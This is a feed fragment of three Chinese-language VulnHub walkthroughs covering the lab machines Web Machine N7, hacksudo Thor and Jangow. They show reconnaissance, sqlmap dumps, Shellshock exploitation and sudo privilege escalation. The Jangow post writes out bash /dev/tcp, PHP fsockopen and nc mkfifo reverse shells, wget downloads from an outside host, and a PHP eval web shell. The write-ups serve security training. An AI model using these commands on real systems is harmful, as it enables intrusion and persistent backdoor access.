            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2ViLW1hY2hpbmUtbjcsNzU2Lw==\">https://www.vulnhub.com/entry/web-machine-n7,756/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd3RodXNreWJsb2cvcC8xNjAyNzk0Ni5odG1s\">https://www.cnblogs.com/wthuskyblog/p/16027946.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 WEBMACHINE：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-362.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.98</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.98</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-363.png\" alt></p>\n<p>-&gt; 靶机开放端口 80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA5Lw==\">http://192.168.31.109/</span> 进行信息收集，一个欢迎界面，审查源代码没有什么新发现，先对目标网站进行目录扫描</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-364.png\" alt></p>\n<p>扫描目录  <code>dirserch -u http://192.168.31.98/</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-365.png\" alt></p>\n<p><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.98/enter_network -x php,txt,html,zip,rar</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-366.png\" alt></p>\n<p>-&gt; 识别到了一个敏感目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvZXhwbG9pdC5odG1s\">http://192.168.31.98/exploit.html</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-367.png\" alt></p>\n<p>发现一个文件上传漏洞的页面，审查源代码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-368.png\" alt></p>\n<p>文件上传后，页面会跳转到 <span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9wcm9maWxlLnBocA==\">http://127.0.0.1/profile.php</span></p>\n<h3 id=\"伪造html界面\"><a class=\"markdownIt-Anchor\" href=\"#伪造html界面\">#</a> 伪造 html 界面</h3>\n<p>伪造一个 html 界面，改变跳转的链接如下，使上传文件的地址到:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvcHJvZmlsZS5waHA=\">http://192.168.31.98/profile.php</span></p>\n<p>开启本地的 python 简易服务器</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-369.png\" alt></p>\n<h3 id=\"文件上传漏洞\"><a class=\"markdownIt-Anchor\" href=\"#文件上传漏洞\">#</a> 文件上传漏洞</h3>\n<p>登陆伪造的 html 界面，点击上传文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-370.png\" alt></p>\n<p>将 kali 自带的 php 反弹 shell 代码修改 ip 和端口号</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-371.png\" alt></p>\n<p>点击选择文件，讲 shell.php 文件上传到目标网站</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-372.png\" alt></p>\n<p>上传完成之后，页面重定向到了 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvcHJvZmlsZS5waHA=\">http://192.168.31.98/profile.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-373.png\" alt></p>\n<p>-&gt; 得到了一半的 flag</p>\n<p>目前得到的信息再无可利用的可能，需要更多的信息，但是不管加载多大的字典，都没有扫出来新的目录，通过查相关教程，发现这里隐藏了一个 enter_network 的目录</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-374.png\" alt></p>\n<p>-&gt; <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yaw==\">http://192.168.31.98/enter_network</span></p>\n<h3 id=\"单点登录测试\"><a class=\"markdownIt-Anchor\" href=\"#单点登录测试\">#</a> 单点登录测试</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-375.png\" alt></p>\n<p>注意到这是一个单点登录的地方，可能存在 sql 注入，也有可能会有 xss 漏洞，弱口令登陆等漏洞，这里简单尝试了一下没有发现有弱口令，尝试对这个目录再次进行目录扫描</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-376.png\" alt></p>\n<p>-&gt; 扫描一个重要的目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yay9hZG1pbi5waHA=\">http://192.168.31.98/enter_network/admin.php</span></p>\n<h3 id=\"修改cookie登陆后台\"><a class=\"markdownIt-Anchor\" href=\"#修改cookie登陆后台\">#</a> 修改 cookie 登陆后台</h3>\n<p>但是此页面只是 admin 的入口，查看网页是否存储了 cookie 的信息</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-377.png\" alt></p>\n<p>看到这里的角色是一串加密数据，是 base64 加密，其中 %253D 相当于 =</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-378.png\" alt></p>\n<p>role 解密后的数据是采用的 md5 加密，继续用 <span class=\"exturl\" data-url=\"aHR0cDovL2NtZDUuY29t\">cmd5.com</span> 解密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-379.png\" alt></p>\n<p>user 解密后的数据仍然是一个更加复杂的加密方式，这个加密暂时无法破解</p>\n<p>-&gt; role 解密后的数据最终显示为 admin, 修改存储在 cookie 中的值为 admin</p>\n<p>再次访问 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yay9hZG1pbi5waHA=\">http://192.168.31.98/enter_network/admin.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-380.png\" alt></p>\n<p>-&gt; 于此，便得到了另外一半的 flag 的值</p>\n<h3 id=\"sqlmap-指定数据包\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-指定数据包\">#</a> sqlmap 指定数据包</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yaw==\">http://192.168.31.98/enter_network</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-381.png\" alt></p>\n<p>这个页面是可能产生 sql 注入的，通过 burp 抓取数据包，讲数据包保存到本地文件 sqlmap.txt 如下</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-382.png\" alt></p>\n<p><code>sqlmap -r sqlmap.txt --batch --dbs</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-383.png\" alt></p>\n<p>找到有四个数据库名</p>\n<h3 id=\"sqlmap-测试数据库\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-测试数据库\">#</a> sqlmap 测试数据库</h3>\n<p><code>sqlmap -r sqlmap.txt --batch -D Machine --tables</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-384.png\" alt></p>\n<p>Machine 数据库中有 login 的表</p>\n<p><code>sqlmap -r sqlmap.txt --batch -D Machine -T login --columns</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-385.png\" alt></p>\n<p>login 表下有 username,password,role 三个列</p>\n<p><code>sqlmap -r sqlmap.txt --batch -D Machine -T login -C username,password,role --dump</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-386.png\" alt></p>\n<p>三个列里边分别有下面三个字段，同时也拿到了 flag</p>\n<p>尝试反弹 shell，通过 os-shell 失败，没有可写入的文件，但是可以通过下面的命令直接调用出 sql 语句，进行查表<br>\n <code>sqlmap -r sqlmap.txt --sql-shell</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-387.png\" alt></p>\n<p>-&gt; 靶机结束</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/119%20THOR/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/119%20THOR/",
            "title": "VULNHUB 19 THOR",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tdGhvciw3MzMv\">https://www.vulnhub.com/entry/hacksudo-thor,733/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU4MDE0NTIuaHRtbA==\">https://www.cnblogs.com/sainet/p/15801452.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 THOR：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-423.png\" alt></p>\n<p>查看靶机所在 win 主机的 ip 地址<br>\n <code>ipconfig | find “192.168.31”</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-424.png\" alt></p>\n<p>与主机同一 MAC 地址的 ip 地址即为靶机 IP</p>\n<p>也可以登陆路由器后台，查看 win 主机上的信息</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-425.png\" alt></p>\n<p>显示有 win 上所有存在过的 ip 地址，以及其 MAC 地址<br>\n -&gt; 靶机 ip：192.168.31.115</p>\n<p>2）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.115</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-426.png\" alt></p>\n<p>-&gt; 靶机开放端口 21,22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE1\">http://192.168.31.115</span> 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-427.png\" alt></p>\n<p>先对目标网站进行目录扫描</p>\n<p><code>dirsearch -u http://192.168.31.115/</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-428.png\" alt></p>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE1L1JFQURNRS5tZA==\">http://192.168.31.115/README.md</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-429.png\" alt></p>\n<p>-&gt; 管理员的用户名是 “admin”，密码是 “password123”。</p>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE1L2luZGV4LnBocA==\">http://192.168.31.115/index.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-430.png\" alt></p>\n<p>-&gt; 输入用户名和密码之后，显示登录失败，可能此密码在其他地方才能登陆</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-431.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE1L2FkbWluX2xvZ2luLnBocA==\">http://192.168.31.115/admin_login.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-432.png\" alt></p>\n<p>-&gt; 成功登陆到对方网站的后台</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-433.png\" alt></p>\n<h3 id=\"sql-注入测试\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入测试\">#</a> SQL 注入测试</h3>\n<p>翻了翻目录没有什么新的发现</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-434.png\" alt></p>\n<p>尝试对登陆的地方进行注入</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-435.png\" alt></p>\n<p>对登陆的地方进行 burp 抓取数据包</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-436.png\" alt></p>\n<p>复制数据包，用 sqlmap 测试发现没有注入点</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-437.png\" alt></p>\n<h3 id=\"cgi-bin-漏洞\"><a class=\"markdownIt-Anchor\" href=\"#cgi-bin-漏洞\">#</a> cgi-bin 漏洞</h3>\n<p>扩大信息收集面，用 dirb 收集更多的目录结构</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-438.png\" alt></p>\n<p>对收集到的 cgi-bin 目录进行更深一级的搜寻<br>\n <code>dirsearch -u http://192.168.31.115/cgi-bin/</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-439.png\" alt></p>\n<p>-&gt; 敏感目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE1L2NnaS1iaW4vc2hlbGwuc2g=\">http://192.168.31.115/cgi-bin/shell.sh</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-440.png\" alt></p>\n<p>直接上谷歌搜索 cgi-bin 的漏洞</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-441.png\" alt></p>\n<p>找到了测试 shellshock 的的命令</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-442.png\" alt></p>\n<p><code>nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh 192.168.31.115</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-443.png\" alt></p>\n<p>-&gt; 确定了此端口存在 CVE-2014-6271 这个漏洞</p>\n<h3 id=\"msf-攻击-shellshock\"><a class=\"markdownIt-Anchor\" href=\"#msf-攻击-shellshock\">#</a> msf 攻击 shellshock</h3>\n<p>利用 msf 寻找此漏洞进行利用</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-444.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search CVE-2014-6271</span><br><span class=\"line\">use exploit/multi/http/apache_mod_cgi_bash_env_exec</span><br><span class=\"line\">set rhosts 192.168.31.115</span><br><span class=\"line\">set targeturi /cgi-bin/shell.sh</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-445.png\" alt></p>\n<p>-&gt; 成功拿到网站反弹的 shell</p>\n<h3 id=\"searchsploit攻击shellshock\"><a class=\"markdownIt-Anchor\" href=\"#searchsploit攻击shellshock\">#</a> searchsploit 攻击 shellshock</h3>\n<p><code>searchsploit shellshock</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-446.png\" alt></p>\n<p><code>searchsploit -x linux/remote/34900.py</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-447.png\" alt></p>\n<p><code>cp /usr/share/exploitdb/exploits/linux/remote/34900.py .</code> <br>\n <code>python 34900.py</code> <br>\n 查看此 exp 是如何利用的</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-448.png\" alt></p>\n<p>根据提示，写全命令行进行攻击</p>\n<p><code>./34900.py payload=reverse rhost=192.168.31.115 lhost=192.168.31.135 lport=5555 pages=/cgi-bin/shell.sh</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-449.png\" alt></p>\n<p>-&gt; 成功拿到反弹后的 shell</p>\n<h3 id=\"pspy64s-监控\"><a class=\"markdownIt-Anchor\" href=\"#pspy64s-监控\">#</a> pspy64s 监控</h3>\n<p>翻阅目录，查找到一个备份文件，猜测此备份由高权限执行，直接上 pspy 进行监控</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-450.png\" alt></p>\n<p>将 pspy 从 kali 机器上下载下来，赋予 x 权限，然后执行</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-451.png\" alt></p>\n<p>等待监控是否执行了一些特殊命令</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-452.png\" alt></p>\n<p>-&gt; 遗憾的是并没有执行什么特殊任务，不能进行提权</p>\n<h3 id=\"service-提权\"><a class=\"markdownIt-Anchor\" href=\"#service-提权\">#</a> service 提权</h3>\n<p>收集服务器的相关信息，sudo -l 确定了可以调用 thor 去执行一个脚本<br>\n <code>sudo -u thor /home/thor/./hamer.sh</code></p>\n<p>输入 bash 后反弹出来了一个 thor 用户的 shell<br>\n <code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-453.png\" alt></p>\n<p>sudo -l 查看 thor 的权限设置，发现其可以直接无密码调用 root 的 service<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v\">https://gtfobins.github.io/</span> 上找到了 service 的提权命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">service 提权</span></span><br><span class=\"line\">sudo service ../../bin/sh</span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-454.png\" alt></p>\n<p>-&gt; 提权成功最终拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/118%20JANGOW/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/118%20JANGOW/",
            "title": "VULNHUB 18 JANGOW",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvamFuZ293LTEwMSw3NTQv\">https://www.vulnhub.com/entry/jangow-101,754/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2t1a3VkZXNodW8vYXJ0aWNsZS9kZXRhaWxzLzEyMjk3NzkxNw==\">https://blog.csdn.net/kukudeshuo/article/details/122977917</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 JANGOW：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-388.png\" alt></p>\n<p>不同的设备会表现出不同的 MAC 地址，这里没有显示出两个相同的 MAC 地址，不好判断哪个才是真正的靶机地址</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">确认承载靶机的win机器的MAC地址</span></span><br><span class=\"line\">ipconfig /all | find “物理地址”</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-389.png\" alt></p>\n<p>通过比较上述两个图可以发现 A0-D3-7A-07-9E-8C 是 win 机器的 MAC 地址，而位于 win 机器上的靶机应该跟 win 主机享有同样的 MAC 地址，因此可以确定目标靶机的 ip 地址为 27</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.27</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-390.png\" alt></p>\n<p>-&gt; 靶机开放端口 21, 80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjc=\">http://192.168.31.27</span> 进行信息收集</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-391.png\" alt></p>\n<p>先对目标网站进行目录扫描</p>\n<p><code>dirsearch -u http://192.168.31.27/</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-392.png\" alt></p>\n<p><code>gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.27/</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-393.png\" alt></p>\n<p>-&gt; 只出现了一个目录 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZQ==\">http://192.168.31.27/site</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-394.png\" alt></p>\n<p>对这个网站可以点击的地方进行了检查，发现存在下面这个 url 地址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj0=\">http://192.168.31.27/site/busque.php?buscar=</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-395.png\" alt></p>\n<p>疑似是一个后门文件，尝试进行 rce 注入</p>\n<h3 id=\"rce漏洞反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#rce漏洞反弹shell\">#</a> RCE 漏洞反弹 shell</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-396.png\" alt></p>\n<p>RCE 漏洞存在，接下来通过这个地方进行反弹 shell，先判断目标服务器是否存在下列可以用来反弹 shell 的命令，可以用 curl bash php 来反弹 shell</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13aGljaCUyMGN1cmw7d2hpY2glMjBiYXNoO3doaWNoJTIwcHl0aG9uO3doaWNoJTIwcGhwOw==\">http://192.168.31.27/site/busque.php?buscar=which curl;which bash;which python;which php;</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-397.png\" alt></p>\n<p>用 wget 来下马，并查看是否将文件下载到了目标服务器上<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13Z2V0JTIwaHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g7bHM=\"> http://192.168.31.27/site/busque.php?buscar=wget http://www.chentuo.asia/shell.sh;ls</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-398.png\" alt></p>\n<p>发现并没有文件被上传上去</p>\n<h3 id=\"rce漏洞绕过方式\"><a class=\"markdownIt-Anchor\" href=\"#rce漏洞绕过方式\">#</a> RCE 漏洞绕过方式</h3>\n<p>思考是否是因为 sh 脚本的原因，换成 php 文件尝试下载</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13Z2V0JTIwaHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwucGhwO2xz\">http://192.168.31.27/site/busque.php?buscar=wget http://www.chentuo.asia/shell.php;ls</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-399.png\" alt></p>\n<p>发现 php 文件也无法被上传上去</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">直接通过bash反弹shell 的命令在url地址上执行</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1iYXNoJTIwLWMlMjAlMjdiYXNoJTIwLWklMjAlM0UmYW1wOyUyMC9kZXYvdGNwLzE5Mi4xNjguMzEuMTM1LzQ0NDQlMjAwJTNFJmFtcDsxJTI3\">http://192.168.31.27/site/busque.php?buscar=bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1'</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-400.png\" alt></p>\n<p>直接通过 bash 反弹也是失败的，尝试通过 php 的代码来反弹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r &#x27;$sock=fsockopen(&quot;192.168.31.135&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;http://192.168.31.27/site/busque.php?buscar=php%20-r%20%27$sock=fsockopen(%22192.168.31.135%22,4444);exec(%22/bin/sh%20-i%20%3C&amp;3%20%3E&amp;3%202%3E&amp;3%22);%27</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-401.png\" alt></p>\n<p>php 反弹 shell 也被服务器拒绝，下面通过 echo 来给服务器上写文件，看是否能写上文件  <code>echo “1” &gt; 1.php;ls</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hvJTIwJTIyMSUyMiUzRTEucGhwO2xz\">http://192.168.31.27/site/busque.php?buscar=echo &quot;1&quot;&gt;1.php;ls</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-402.png\" alt></p>\n<p>-&gt; 可以写文件，那么就尝试可以写后门</p>\n<h3 id=\"echo-后门至服务器\"><a class=\"markdownIt-Anchor\" href=\"#echo-后门至服务器\">#</a> echo 后门至服务器</h3>\n<p>通过 echo 将 bash 反弹的代码写到目标服务器上</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hv\">http://192.168.31.27/site/busque.php?buscar=echo</span> “bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1’” &gt; <span class=\"exturl\" data-url=\"aHR0cDovLzEuc2g=\">1.sh</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-403.png\" alt></p>\n<p>写入失败，页面无反应，看来不能写 sh 文件，还得写 php 文件</p>\n<p>写一个 php 一句话后门，判断是否能写上</p>\n<p>echo ‘<?php @eval($_POST['x']); ?>’ &gt;attack.php <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hvJTIwJTI3JTNDP3BocCUyMEBldmFsKCRfUClPU1QlNUIlMjd4JTI3JTVE\">http://192.168.31.27/site/busque.php?buscar=echo '&lt;?php @eval($_P)OST[‘x’]</span>);%20?%3E%27%20%3E%20attack.php;ls</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-404.png\" alt></p>\n<p>-&gt; php 一句话后门写入成功</p>\n<p>查看写的文件是否完整</p>\n<p>view-source:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1jYXQlMjBhdHRhY2sucGhw\">http://192.168.31.27/site/busque.php?buscar=cat attack.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-405.png\" alt></p>\n<p>-&gt; 拿到了网站权限</p>\n<h3 id=\"蚁剑突破网站权限\"><a class=\"markdownIt-Anchor\" href=\"#蚁剑突破网站权限\">#</a> 蚁剑突破网站权限</h3>\n<p>通过蚁剑连接到一句话后门的网站</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9hdHRhY2sucGhw\">http://192.168.31.27/site/attack.php</span> 密码就是 attack.php 文件中的 x</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-406.png\" alt></p>\n<p>测试连接成功，可以用来连接网站，尔后可以看到服务器上所有的文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-407.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">新建一个 1.php，用来通过php来系统命令反弹shell</span></span><br><span class=\"line\">&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.135</span><br><span class=\"line\"><span class=\"meta prompt_\">4444&gt;</span><span class=\"language-bash\">/tmp/f<span class=\"string\">&quot;);?&gt;</span></span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-408.png\" alt></p>\n<p>写入文件成功了，但是没有被执行，并且查看文件发现是空的</p>\n<p>view-source:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS8xLnBocA==\">http://192.168.31.27/site/1.php</span><br>\n<img 